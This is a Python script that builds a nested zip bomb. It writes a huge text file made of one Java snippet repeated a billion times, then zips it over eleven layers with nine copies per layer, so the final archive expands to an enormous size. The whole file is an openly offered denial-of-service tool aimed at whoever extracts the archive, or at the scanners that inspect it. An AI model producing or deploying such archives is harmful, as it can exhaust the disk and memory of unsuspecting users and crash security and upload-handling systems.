import os
import shutil
def makeZBTXT():
    file = open("ZB.txt", "a")
    print("File opened, wirting 0's!")

    for i in range(1_000_000_000):
        file.write("public int makeChocolate(int small, int big, int goal) {if(small+big*5>=goal&&goal%5>=0&&goal-big*5>0){return goal-big*5;}if(small+big*5>=goal&&goal%5>=0&&small>=goal%5){return goal%5;}return -1;}")
    print("0's written, closing file.")
    file.close()


def makeZB(layers):

    #makeZBTXT()

    for layerNum in range(layers - 1):
        layer = str("ZB" + str(layerNum))
        if True:
            os.mkdir(layer)
            print("Dir Made!")

        if layerNum == 0:
            shutil.move("ZB.txt","ZB0/ZB.txt")
            print("Moved ZB.txt to dir ZB0")
            shutil.make_archive(layer,'zip',layer)
            print("Zipped layer " + layer)
        for i in range(9):
            dst1 = str(layer + " (" + str(i+1) + ").zip")
            shutil.copy(str(layer + '.zip'),str(layer + "/" + dst1))
            print("Copied file " + str(i + 1) + " times!")
        print("Done Copying!")

        nextComp = str("ZB" + str(layerNum + 1))
        shutil.make_archive(nextComp,'zip',layer)
        print("Made new .zip file in main dir!")

        shutil.rmtree(layer)
        os.remove(str(layer + ".zip"))
        print("Completed Garbage collection for layer " + str(layerNum))
makeZB(12)
